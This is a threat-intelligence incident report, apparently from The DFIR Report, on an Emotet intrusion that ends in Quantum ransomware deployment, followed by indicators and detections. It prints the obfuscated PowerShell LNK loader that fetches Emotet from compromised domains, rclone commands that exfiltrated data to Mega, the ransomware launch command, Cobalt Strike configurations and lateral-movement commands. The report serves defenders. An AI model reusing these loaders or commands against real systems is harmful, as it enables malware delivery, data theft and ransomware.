            "On the fifth day of the intrusion, the threat actors appeared again to try and exfiltrate some data from the mail server again using Rclone but this appeared to fail and the threat actors did not try to resolve the issue.",
            "After this the threat actors went silent until the eighth and final day of the intrusion. ",
            "On the eighth day of the intrusion the threat actor accessed the environment using Tactical RMM to deploy Anydesk on the compromised host.",
            "After establishing a connection using Anydesk, the threat actors then dropped SoftPerfect\u2019s Network Scanner and ran it to identify hosts across the environment. ",
            "From there, the threat actors began connecting to other hosts via RDP, including the a backup server.",
            "After choosing a new server and connecting via RDP, the threat actors dropped Powertool64.exe and dontsleep.exe in preparation for their final actions.",
            "Finally, locker.dll and a batch file 1.bat were dropped on the host and the batch file was executed beginning the Quantum rasomware deployment to all hosts over SMB.",
            "From initial intrusion to ransomware deployment, 154 hours passed, over eight days. ",
            "After ransomware deployment, the threat actors remained connected and did RDP to a few other servers and executed ProcessHacker.exe and a net command.",
            "With no other activity taking place, we assess that this was likely the threat actors confirming successful deployment of the ransomware payload across the network. ",
            "Services We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, BumbleBee, Covenant, Metasploit, Empire, PoshC2, etc.",
            "More information on this service and others can be found here. ",
            "Both of the Cobalt Strike servers in this case were on our Threat Feed (days to months) in advance of this intrusion. ",
            "We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services. ",
            "Timeline Report Lead: @iiamaleksAnalysis and reporting: @samaritan_o, and @yatinwad Initial Access Initial access took the form of an LNK file delivered to a victim through a MalSpam campaign. ",
            "The Powershell script embedded within the LNK is a Base64 encoded script with various components split into different variables for obfuscation purposes.",
            "The script will decode itself rather than depend on Powershell\u2019s built-in ability to execute encoded scripts. ..",
            "\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c \"&{'p8ArwZsj8ZO+Zy/dHPeI+siGhbaxtEhzwmd3zVObm9uG2CGKqz5m4AdzKWWzPmKrjJieG4O9';$BxQ='uYnIvc3RhdHMvUkppMnJRSTRRWHJXQ2ZnZG1pLyIsImh0dHBzOi8vd3d3LmVsYWJvcm8ucGwvaW1ncy9KWkgyR0lIdG9PNy8iLCJodHRwczovL2 VsLWVuZXJnaWFraS5nci93cC1pbmNsdWRlcy9JZHJWS09HWU1Rb2R1N0lsT0loLyIsImh0dHA6Ly9kcmVjaHNsZXJzdGFtbXRpc2NoLmRlL2ZvbnRzL1pBeVhic2YvIiwiaHR0cDovL2RobmNvbnN0cnVjY2lvbmVzLmNvbS5hci93cC1hZG1pbi9TbTAyWnNWRFlXZG9UYjdycUw vIiwiaHR0cDovL2RpbHNybC5jb20vcGhvbmUvcGZpcDVtLyIpOyR0PSJuZldGUSI7JGQ9IiRlbnY6VE1QXC4uXCR0Ijtta2RpciAtZm9yY2UgJGQgfCBvdXQtbnVsbDtmb3JlYWNoICgkdSBpbiAkbGlua3MpIHt0cnkge0lXUiAkdSAtT3V0RmlsZSAkZFxqeEtQSXJNRnhKLk9P ZjtSZWdzdnIzMi5leGUgIiRkXGp4S1BJck1GeEouT09mIjticmVha30gY2F0Y2ggeyB9fQ==';$KOKN='ICBXcml0ZS1Ib3N0ICJBcFBoUiI7JFByb2dyZXNzUHJlZmVyZW5jZT0iU2lsZW50bHlDb250aW51ZSI7JGxpbmtzPSgiaHR0cHM6Ly9kZXNjb250YWRvci5jb20';$KO KN=$KOKN+$BxQ;$GBUus=$KOKN;$xCyRLo=[System.Text.Encoding]::ASCII.GetString([System.",
            "Convert]::FromBase64String($GBUus));$GBUus=$xCyRLo;iex($GBUus)}\" The Powershell script, when double clicked (executed), will attempt to connect to a set of domains containing the Emotet malware.",
            "Upon successful download of the Emotet malware, the PowerShell script will write it to a temporary directory and execute the payload via regsvr32.exe. ",
            "It is interesting to note, the LNK identifies the machine it was created on through the NetBIOS name of black-dog and a MAC Address beginning with 08:00:27 indicating a system running on Virtualbox. ",
            "Machine ID: black-dog MAC Address: 08:00:27:c6:74:5d MAC Vendor: PCS SYSTEMTECHNIK Creation: 2022-05-12 15:33:49 Execution Once the PowerShell script from the LNK file executed successfully",
            ", Emotet began execution.",
            "Emotet will initially copy itself to a randomly named folder in the users temporary folder. ",
            "Multiple instances of Emotet spawning itself was observed over a period of three days.",
            "Almost all the instances of Emotet included three enumeration commands executed: systeminfo ipconfig /all ",
            "nltest /dclist: Towards the third and fourth day of the intrusion, Cobalt Strike was dropped to disk as a PE executable and executed.",
            "This access was used to perform enumeration and move laterally to other hosts. ",
            "The following diagram aims to provide an illustration of the execution chain with multiple instances of Emotet leading to Cobalt Strike. ",
            "Persistence The Emotet malware has used various persistence methods over time, an example can be seen here. ",
            "On the first day, Emotet established persistence via a run key. ",
            "As we can see, the regsvr32.exe Windows\u2019s native utility was used to launch the Emotet DLL. ",
            "After moving to the hands on keyboard phase of the intrusion, the threat actors proceeded to deploy several remote management tools across the environment.",
            "Tactical RMM was the first tool chosen for deployment.",
            "Tactical RMM is a remote management software platform that uses a combination of agents to allow for remote management and access to systems. ",
            "The file 17jun.exe, was deployed into the programdata folder on one of the servers.",
            "This was then executed by the threat actors and resulted in the installation of the main RMM agent.",
            "The install completed with the following command. ",
            "\"C:\\Program Files\\TacticalAgent\\tacticalrmm.exe\" -m install --api https://api.floppasoftware[.]com --client-id 1 --site-id 1 --agent-type server --auth 5bc5f5263224697ff9a653f8efa7e7d7a2ce341920a03c60e4823331b2508c ",
            "A service was also created for the agent. ",
            "Event 7045A service was installed in the system.",
            "Service Name: TacticalRMM Agent ServiceService File Name: \"C:\\Program Files\\TacticalAgent\\tacticalrmm.exe\"",
            "-m svcService Type: user mode serviceService Start Type: auto startService Account:",
            "LocalSystem Along with the tacticalrmm.exe client, a second executable called meshagent.exe, was installed to handle remote session interaction, and a separate service was created for that agent. ",
            "Service Name: Mesh AgentService File Name: \"C:\\Program Files\\Mesh Agent\\MeshAgent.exe\"Service Type: user mode serviceService Start Type: auto startService Account:",
            "LocalSystem On the final day of the intrusion, the threat actors added AnyDesk to the same server running Tactical RMM, providing an additional means of access prior to the deployment of ransomware. ",
            "Service Name: AnyDesk ServiceService File Name: \"C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe\" --serviceService",
            "Type: user mode serviceService Start Type: auto startService Account:",
            "LocalSystem Privilege Escalation We suspect a failed ZeroLogon exploit was attempted against a domain controller, originating from the beachhead host with Cobalt Strike running on it.",
            "One indicator is the \u2018mimikatz\u2019 string in the Netlogon event that is used by the Mimikatz Zerologon implementation. ",
            "During a period of a few seconds, multiple NetrServerReqChallenge and NetrServerAuthenticate2 methods in the traffic from a single source were observed, this is one of the indicators of a Zerologon attempt. ",
            "Defense Evasion Process Injection The threat actor was observed process injecting into legitimate process and using them to execute their own tasks on the system, this can be seen from Winlogon connecting to a domain associated with a Cobalt Strike server and removing files from the system. ",
            "The specific mechanism used to inject into a foreign process, was injecting arbitrary code into its memory space, and executing it as a remotely created thread.",
            "This occurred from rundll32.exe, which was previously used to execute and run Cobalt Strike. ",
            "The following table summarizes the processes used for injection during this case: Injected Process Name Injection Payload C:\\Windows\\system32\\winlogon.exe Cobalt Strike C:\\Windows\\System32\\RuntimeBroker.exe Cobalt Strike C:\\Windows\\System32\\svchost.exe Cobalt Strike C:\\Windows\\System32\\taskhostw.exe Cobalt Strike C:\\Windows\\system32\\dllhost.exe Cobalt Strike PowerTool PowerTool was observed, dropped and executed on the server used to deploy the ransomware payload.",
            "This tool has the ability to kill a process, delete its process file, unload drivers, and delete the driver files.",
            "It has been reportedly used by several ransomware groups to aid in their operations [1][2][3][4]. ",
            "As a byproduct of execution, PowerTool will drop a driver to disk and load it into the system. ",
            "Driver Signature Name:",
            "\u5317\u4eac\u534e\u6797\u4fdd\u8f6f\u4ef6\u6280\u672f\u6709\u9650\u516c\u53f8 Indicator Removal The threat actor was observed deleting files that had been dropped to disk. ",
            "Credential Access Process access to LSASS was observed, likely to dump credentials from a process that was injected with Cobalt Strike.",
            "The Granted Access level matches know indicators for Mimikatz with an access value of 0x1010 (4112), as we covered in a prior report. ",
            "We also observed a Cobalt Strike executable request access level of 0x0040 (64) to LSASS, as well indicating other credential access tools may have been in use by the threat actor. ",
            "Discovery During the initial Emotet execution, three automated discovery commands were observed.",
            "These were then repeated, seen occurring once a day from the Emotet host. systeminfo ipconfig /all ",
            "nltest /dclist: Multiple commands responsible for enumerating Active Directory groups, domain joined computers, and domain trusts, were executed via Cobalt Strike on the beachhead. ",
            "whoami /groups net group /domain net group \"domain computers\" /domain ",
            "net group /domain",
            "\"Domain controllers\" net group \"domain admins\" /domain nltest /trusted_domains ",
            "The threat actor was observed querying a non-existent group Domain controller, followed by a command correcting the mistake that queried the group Domain controllers . ",
            "\"Domain controller\" net group /domain",
            "\"Domain controllers\" A ping command issued to a user workstation and a domain controller were observed moments before lateral movement was attempted. ",
            "ping COMPUTER.REDACTED.local Invoke-ShareFinder was observed being used via Powershell in the environment from an injected process with Cobalt Strike: ",
            "In addition to the Invoke-ShareFinder command, other functions that were used by the script were also observed. ",
            "The remnants of Invoke-ShareFinder could also be seen on the network through the consistent querying of \u201cADMIN$\u201d and \u201cC$\u201d shares for each host over a short period of time.",
            "In addition to these shares, a few shares from the file servers were also accessed. ",
            "Once on the domain controller, two batch files were run.",
            "The first find.bat was used to run AdFind.exe for Active Directory discovery. ",
            "find.exe -f",
            "\"objectcategory=computer\" find.exe -f \"(objectcategory=organizationalUnit)\" find.exe -subnets -f (objectCategory=subnet) find.exe -f \"(objectcategory=group)\" find.exe -gcb -sc trustdmp The second script, p.bat, was run to sweep the network using ping, looking for network connectivity and online hosts. ",
            "On the final day, prior to ransom deployment, the threat actor also dropped netscan.exe on the server, and executed it from the Tactical RMM meshagent.exe session. ",
            "C:\\Windows\\System32\\mstsc mstsc.exe /v:",
            "IP_ADDRESS_1 C:\\Windows\\System32\\mstsc mstsc.exe /v:IP_ADDRESS_2 C:\\Windows\\SysWOW64\\explorer.exe \"C:\\Windows\\SysWOW64\\explorer.exe\" \\\\IP_ADDRESS_1\\C$ C:\\Windows\\SysWOW64\\explorer.exe \"C:\\Windows\\SysWOW64\\explorer.exe\" \\\\IP_ADDRESS_2\\C$ Lateral Movement Cobalt Strike Remote Service Creation The threat actor was observed creating remote services in order to execute beacon DLL files transferred via SMB as SYSTEM on remote hosts. ",
            "C:\\Windows\\System32\\cmd.exe /c rundll32.exe C:\\ProgramData\\x86.dll, StartA WMI ",
            "In another instance, an executable Cobalt Strike beacon was copied via SMB to a target machine, and then executed via WMI. ",
            "wmic /node:IP_Address process call create \"cmd.exe /c start C:\\Progradata\\sc_https_x64.exe\" Remote Desktop Lastly, traces of RDP (Remote Desktop Protocol) connections were discovered on multiple compromised hosts utilized for lateral movement on the final day of the intrusion and during the ransomware deployment. ",
            "Collection On the third day of the intrusion, after moving laterally, the threat actors began to review sensitive documents stored on network shares, including revenue, insurance, and password storage documents. ",
            "These documents were again reviewed by the threat actor on the final day of the intrusion.",
            "Later the threat actor viewed the stolen files off network, observed by triggered canary tokens, which revealed connections from an AWS EC2 instance. Command and Control Emotet The Emotet loader pulled the main second stage payload from the following domains: ",
            "hxxps://descontador[.]com[.]br hxxps://www.elaboro[.]pl hxxps://el-energiaki[.]gr hxxp://drechslerstammtisch[.]de hxxp://dhnconstrucciones[.]com[.]ar hxxp://dilsrl[.]com The second stage loader had multiple IP addresses in its configuration to attempt connections to: 103.159.224.46 103.75.201.2 119.193.124.41 128.199.225.17 131.100.24.231 139.59.60.88 144.217.88.125 146.59.226.45 ",
            "149.56.131.28 159.89.202.34 165.22.211.113 165.227.166.238 178.128.82.218 209.126.98.206 213.32.75.32 37.187.115.122 45.226.53.34 45.55.134.126 46.55.222.11 51.210.176.76 51.254.140.238 54.37.70.105 82.223.82.69 91.207.181.106 92.114.18.20 94.23.45.86 96.125.171.16 Cobalt Strike The following Cobalt Strike C2 servers were observed being used.",
            "Both HTTP and HTTPS were observed to be used. ",
            "139.60.161.167 (survefuz[.]com) 139.60.160.18 (juanjik[.]com) 139.60.161.167 (survefuz[.]com) JA3s: 211897664d51cffdfd7f78d684602ecc JA3: a0e9f5d64349fb13191bc781f81f42e1 Certificate: 03:4e:01:cb:d0:d4:40:24:ad:e0:cd:81:9f:00:44:0f:1e:de Not Before: May 24 11:25:15 2022 GMT Not After: Aug 22 11:25:14 2022 GMT Issuer Org: Let's Encrypt Subject Common: survefuz[.]com Public Algorithm: id-ecPublicKey 139.60.160.18 (juanjik[.]com) JA3s: 211897664d51cffdfd7f78d684602ecc JA3: a0e9f5d64349fb13191bc781f81f42e1 Certificate: 04:ea:aa:59:1e:c6:50:6e:d3:70:d4:24:50:f0:a5:30:9a:e6 Not Before: Jun 14 17:38:08 2022 GMT Not After: Sep 12 17:38:07 2022 GMT Issuer Org: Let's Encrypt Subject Common: juanjik[.]com ",
            "Public Algorithm: rsaEncryption The following are the Cobalt Strike configurations observed: 139.60.161.167 (survefuz[.]com) { \"beacontype\": [ \"HTTP\" ], \"sleeptime\": 45000, \"jitter\": 37, \"maxgetsize\": 1403644, \"spawnto\": \"AAAAAAAAAAAAAAAAAAAAAA==\", \"license_id\": 206546002, \"cfg_caution\": false, \"kill_date\": null, \"server\": { \"hostname\": \"survefuz[.]com\", \"port\": 80, \"publickey\": \"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCqoyVkBHx713LeUHmw7FAozt15LWTMgX1nCLSXECllryUTD8E7tTjJLIy4Hg27yiG56NFyXzCzL70T7HPzWGd7fJN1H5exgB19psw4c1qwuqkWLlO8GDOT6gFzQwY0FA/eKvDfgxatj387yoR2U+hfo0I0GiO4x4V7c9ow/OlHXwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==\" }, \"host_header\": \"\", \"useragent_header\": null, \"http-get\": { \"uri\": \"/jquery-3.3.1.min.js\", \"verb\": \"GET\", \"client\": { \"headers\": null, \"metadata\": null }, \"server\": { \"output\": [ \"print\", \"append 1522 characters\", \"prepend 84 characters\", \"prepend 3931 characters\", \"base64url\", \"mask\" ] } }, \"http-post\": { \"uri\": \"/jquery-3.3.2.min.js\", \"verb\": \"POST\", \"client\": { \"headers\": null, \"id\": null, \"output\": null } }, \"tcp_frame_header\": \"AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\", \"crypto_scheme\": 0, \"proxy\": { \"type\": null, \"username\": null, \"password\": null, \"behavior\": \"Use IE settings\" }, \"http_post_chunk\": 0, \"uses_cookies\": true, \"post-ex\": { \"spawnto_x86\": \"%windir%\\\\syswow64\\\\dllhost.exe\", \"spawnto_x64\": \"%windir%\\\\sysnative\\\\dllhost.exe\" }, \"process-inject\": { \"allocator\": \"NtMapViewOfSection\", \"execute\": [ \"CreateThread 'ntdll!RtlUserThreadStart'\", \"CreateThread\", \"NtQueueApcThread-s\", \"CreateRemoteThread\", \"RtlCreateUserThread\" ], \"min_alloc\": 17500, \"startrwx\": false, \"stub\": \"yl5rgAigihmtjA5iEHURzg==\", \"transform-x86\": [ \"prepend '\\\\x90\\\\x90'\" ], \"transform-x64\": [ \"prepend '\\\\x90\\\\x90'\" ], \"userwx\": false }, \"dns-beacon\": { \"dns_idle\": null, \"dns_sleep\": null, \"maxdns\": null, \"beacon\": null, \"get_A\": null, \"get_AAAA\": null, \"get_TXT\": null, \"put_metadata\": null, \"put_output\": null }, \"pipename\": null, \"smb_frame_header\": \"AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\", \"stage\": { \"cleanup\": true }, \"ssh\": { \"hostname\": null, \"port\": null, \"username\": null, \"password\": null, \"privatekey\": null } } 139.60.160.18:80 (juanjik[.]com) { \"spawnto\": \"AAAAAAAAAAAAAAAAAAAAAA==\", \"dns_beacon\": {}, \"smb_frame_header\": \"AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\", \"post_ex\": { \"spawnto_x64\": \"%windir%\\\\sysnative\\\\dllhost.exe\", \"spawnto_x86\": \"%windir%\\\\syswow64\\\\dllhost.exe\" }, \"stage\": { \"cleanup\": true }, \"process_inject\": { \"stub\": \"yl5rgAigihmtjA5iEHURzg==\", \"transform_x64\": [ \"prepend '\\\\x90\\\\x90'\" ], \"transform_x86\": [ \"prepend '\\\\x90\\\\x90'\" ], \"startrwx\": false, \"min_alloc\": \"17500\", \"userwx\": false, \"execute\": [ \"CreateThread 'ntdll!RtlUserThreadStart'\", \"CreateThread\", \"NtQueueApcThread-s\", \"CreateRemoteThread\", \"RtlCreateUserThread\" ], \"allocator\": \"NtMapViewOfSection\" }, \"uses_cookies\": true, \"http_post_chunk\": \"0\", \"ssh\": {}, \"maxgetsize\": \"1403644\", \"proxy\": { \"behavior\": \"Use IE settings\" }, \"tcp_frame_header\": \"AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\", \"server\": { \"publickey\": \"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCbFjn9w4cE3slYf3jYqTw3S+6HxAGZd3cMpTqKnDsmGAmCsll4R4jp5yz2SnrpRz8brvoZNotuWhqu71R0FqaAkaaheF5MrOHJBbCvGKDu4m6RZ0DHicJCpj6YIm0FLHNNZugHhV5Ou9lZaseCTECMnk0rXiwTsiRWv9ikRccwHwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==\", \"port\": \"443\", \"hostname\": \"juanjik[.]com\" }, \"beacontype\": [ \"HTTPS\" ], \"license_id\": \"206546002\", \"jitter\": \"37\", \"sleeptime\": \"45000\", \"http_get\": { \"server\": { \"output\": [ \"print\", \"append 1522 characters\", \"prepend 84 characters\", \"prepend 3931 characters\", \"base64url\", \"mask\" ] }, \"client\": { \"metadata\":",
            "[], \"headers\": [] }, \"verb\": \"GET\", \"uri\": \"/jquery-3.3.1.min.js\" }, \"cfg_caution\": false, \"host_header\": \"\", \"crypto_scheme\": \"0\", \"http_post\": { \"client\": { \"output\": [], \"id\": [], \"headers\": [] }, \"verb\": \"POST\", \"uri\": \"/jquery-3.3.2.min.js\" } } 139.60.160.18:443 (juanjik[.]com) { \"spawnto\": \"AAAAAAAAAAAAAAAAAAAAAA==\", \"dns_beacon\": {}, \"smb_frame_header\": \"AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\", \"post_ex\": { \"spawnto_x64\": \"%windir%\\\\sysnative\\\\dllhost.exe\", \"spawnto_x86\": \"%windir%\\\\syswow64\\\\dllhost.exe\" }, \"stage\": { \"cleanup\": true }, \"process_inject\": { \"stub\": \"yl5rgAigihmtjA5iEHURzg==\", \"transform_x64\": [ \"prepend '\\\\x90\\\\x90'\" ], \"transform_x86\": [ \"prepend '\\\\x90\\\\x90'\" ], \"startrwx\": false, \"min_alloc\": \"17500\", \"userwx\": false, \"execute\": [ \"CreateThread 'ntdll!RtlUserThreadStart'\", \"CreateThread\", \"NtQueueApcThread-s\", \"CreateRemoteThread\", \"RtlCreateUserThread\" ], \"allocator\": \"NtMapViewOfSection\" }, \"uses_cookies\": true, \"http_post_chunk\": \"0\", \"ssh\": {}, \"maxgetsize\": \"1403644\", \"proxy\": { \"behavior\": \"Use IE settings\" }, \"tcp_frame_header\": \"AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\", \"server\": { \"publickey\": \"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCbFjn9w4cE3slYf3jYqTw3S+6HxAGZd3cMpTqKnDsmGAmCsll4R4jp5yz2SnrpRz8brvoZNotuWhqu71R0FqaAkaaheF5MrOHJBbCvGKDu4m6RZ0DHicJCpj6YIm0FLHNNZugHhV5Ou9lZaseCTECMnk0rXiwTsiRWv9ikRccwHwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==\", \"port\": \"80\", \"hostname\": \"juanjik[.]com\" }, \"beacontype\": [ \"HTTP\" ], \"license_id\": \"206546002\", \"jitter\": \"37\", \"sleeptime\": \"45000\", \"http_get\": { \"server\": { \"output\": [ \"print\", \"append 1522 characters\", \"prepend 84 characters\", \"prepend 3931 characters\", \"base64url\", \"mask\" ] }, \"client\": { \"metadata\":",
            "[], \"headers\": [] }, \"verb\": \"GET\", \"uri\": \"/jquery-3.3.1.min.js\" }, \"cfg_caution\": false, \"host_header\": \"\", \"crypto_scheme\": \"0\", \"http_post\": { \"client\": { \"output\": [], \"id\": [], \"headers\": [] }, \"verb\": \"POST\", \"uri\": \"/jquery-3.3.2.min.js\" } } Tactical RMM Agent The threat actor dropped a Tactical RMM Agent on one of the servers as an alternative command and control avenue to access the network.",
            "During the installation of the software, the following command was observed: \"C:\\Program Files\\TacticalAgent\\tacticalrmm.exe\"",
            "-m install --api https://api.floppasoftware[.]com --client-id 1 --site-id 1 --agent-type server --auth REDACTED This command reveals the floppasoftware.com domain used by the threat actor for the remote management of Tactical RMM Agent.",
            "This domain was registered very close to the timeline of this incident. ",
            "A domain registered to be used with Tactical RMM Agent will have both an api and mesh subdomain, in this case api.floppasoftware[.]com and mesh.floppasoftware[.]com.",
            "These were both hosted on the same server IP: 212.73.150.62. ",
            "In addition, during the execution of Tactical RMM Agent, the software will reach out to a centralized domain in order to retrieve the current public IP address in use: icanhazip.tacticalrmm.io AnyDesk On the final day of the intrusion, AnyDesk was deployed on the server they had previously installed Tactical RMM on.",
            "Using this RMM agent they proceeded to install AnyDesk on the host.",
            "The following process activity was observed from meshagent.exe. ",
            "MeshAgent.exe -kvm1 - Initiating Process File Name, column 6, row 12 \"MeshAgent.exe\" -b64exec cmVxdWlyZSgnd2luLWNvbnNvbGUnKS5oaWRlKCk7cmVxdWlyZSgnd2luLWRpc3BhdGNoZXInKS5jb25uZWN0KCczNzQ3Jyk7 The decoded base 64 content reveals commands for console access and connect actions. ",
            "This is then followed by the following process flow: Once downloaded and installed, the threat actor initiated a connection to the AnyDesk host. ",
            "Client-ID: 752733537 (FPR: 27ac27e2c9ed) Logged in from 84.17.49.114:1249 Exfiltration Also seen in our last report on Emotet, threat actors leveraged Rclone to exfiltrate data to Mega (Mega.nz) storage services. rclone.exe copy \"\\\\SERVER.domain.name\\path\" mega:1 -q --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6 rclone.exe copy \"\\\\SERVER.domain.name\\path\" mega:2 -q --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6 From the rclone.conf file, the threat actors left the details of the remote account being used. ",
            "[email protected] With the help of Netflow, we identified that at least ~250MB worth of data was exfiltrated out of the environment. ",
            "Impact Spam Email During the first two days, Emotet sent outbound spam emails over SMTP: ",
            "The following is an example of the SMTP traffic for sending the email, along with an extracted EML that was sent with an attached XLS: Ransomware Towards the last day of the intrusion, the threat actor made their preparations to deploy ransomware to the domain.",
            "They started by connecting to a new server via RDP from the server they just used Tactical RMM to deploy Anydesk.",
            "Once establishing the RDP connection, they deployed Powertool64.exe, likely to prevent intervention by any security tools and launched the software Don\u2019t Sleep. ",
            "Don\u2019t Sleep has the capability to keep the computer from being shutdown and the user from being signed off.",
            "This was likely done to ensure nothing will interfere with the propagation of the ransomware payload. ",
            "Finally, with Don\u2019t Sleep running, the threat actor executed a batch script named \u201c1.bat\u201c.",
            "The script invoked the main ransomware payload, locker.dll, and passed a list of all the computers in the domain to the target parameter. ",
            "rundll32.exe locker.dll,run /TARGET=\\\\HOST1.DOMAIN.NAME\\C$",
            "/TARGET=\\\\HOST2.DOMAIN.NAME\\C$ /TARGET=\\\\HOST3.DOMAIN.NAME\\C$ /login",
            "=DOMAIN\\Administrator /password=[REDACTED]",
            "/nolog /shareall ",
            "The executable began to encrypt all the targeted hosts in the environment and dropped a ransom note: README_TO_DECRYPT.html After the invocation of the ransomware payload, about a minute later, the threat actor launched Process Hacker.",
            "We believe this was to monitor the execution of the ransomware payload. ",
            "All systems in the domain were encrypted and presented with a ransom message. ",
            "Indicators Atomic Emotet Deployment Domains descontador[.]com[.]br www.elaboro[.]pl el-energiaki[.]gr drechslerstammtisch[.]de dhnconstrucciones[.]com[.]ar dilsrl[.]com Emotet C2 Servers 103.159.224.46 103.75.201.2 119.193.124.41 128.199.225.17 131.100.24.231 139.59.60.88 144.217.88.125 146.59.226.45 149.56.131.28 159.89.202.34 165.22.211.113 165.227.166.238 178.128.82.218 209.126.98.206 213.32.75.32 37.187.115.122 45.226.53.34 45.55.134.126 46.55.222.11 51.210.176.76 51.254.140.238 54.37.70.105 82.223.82.69 91.207.181.106 92.114.18.20 94.23.45.86 96.125.171.165 Cobalt Strike 139.60.161.167 (survefuz[.]com) 139.60.160.18 (juanjik[.]com) Tactical RMM Agent api.floppasoftware[.]com mesh.floppasoftware[.]com 212.73.150.62 Computed K-1 06.13.2022.lnk de7c4da78a6cbba096e32e5eecb00566 02b4f495e9995cc2251c19cd9984763f52122951 1bf9314ae67ab791932c43e6c64103b1b572a88035447dae781bffd21a1187ad 17jun.exe 0ea68856c4f56f4056502208e97e9033 b80c987c8849bf7905ea8f283b79d98753e3c15a 41e230134deca492704401ddf556ee2198ef6f32b868ec626d9aefbf268ab6b1 dontsleep.exe 50cc3a3bca96d7096c8118e838d9bc16 b286b58ed32b6df4ecdb5df86d7d7d177bb7bfaf f8cff7082a936912baf2124d42ed82403c75c87cb160553a7df862f8d81809ee locker.dll d2df4601c8d43e655163c0b292bc4cc9 f6727d5d04f2728a3353fbd45d7b2cb19e98802c 6424b4983f83f477a5da846a1dc3e2565b7a7d88ae3f084f3d3884c43aec5df6 netscan.exe 27f7186499bc8d10e51d17d3d6697bc5 52332ce16ee0c393b8eea6e71863ad41e3caeafd 18f0898d595ec054d13b02915fb7d3636f65b8e53c0c66b3c7ee3b6fc37d3566 rclone.exe 22bbe1747933531e9c240e0db86268e2 c2a8776e21403eb00b38bfccd36d1c03dffb009e 53ae3567a34097f29011d752f1d3afab8f92beb36a8d6a5df5c1d4b12edc Behavioral The threat actor delivered Emotet via a Emotet loader in the form of a LNK file responsible for dropping Emotet via Powershell (K-1 06.13.2022.lnk). ",
            "Tactical RMM Agent was installed by the threat actor on a server to ensure remote access (17jun.exe). ",
            "Data was exfiltrated to Mega cloud service via Rclone (rclone.exe). ",
            "Network mapping was performed using SoftPerfect Network Scanner (netscan.exe) followed by Quantum ransomware execution and propagation in the network (locker.dll). ",
            "The threat actor kept the remote desktop session alive by running a program to keep the session active (dontsleep.exe) Detections Network The DFIR Report Cobalt Strike 139.60.160.18The DFIR Report Cobalt Strike 139.60.161.167 ET Threatview.io High Confidence Cobalt Strike C2 IP group 1 ET POLICY SMB2 NT Create AndX Request For an Executable File ET POLICY SMB Executable File Transfer ET RPC DCERPC SVCCTL - Remote Service Control Manager Access ET INFO Observed External IP Lookup Domain (icanhazip .com",
            "in TLS SNI)t ET JA3 HASH - Possible Rclone Client Response (Mega Storage) ET POLICY HTTP POST",
            "to MEGA Userstorage ET POLICY SMB Executable File Transfer ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement ET POLICY SMB2 NT Create AndX Request For an Executable File ET POLICY SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software) ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection ET USER_AGENTS",
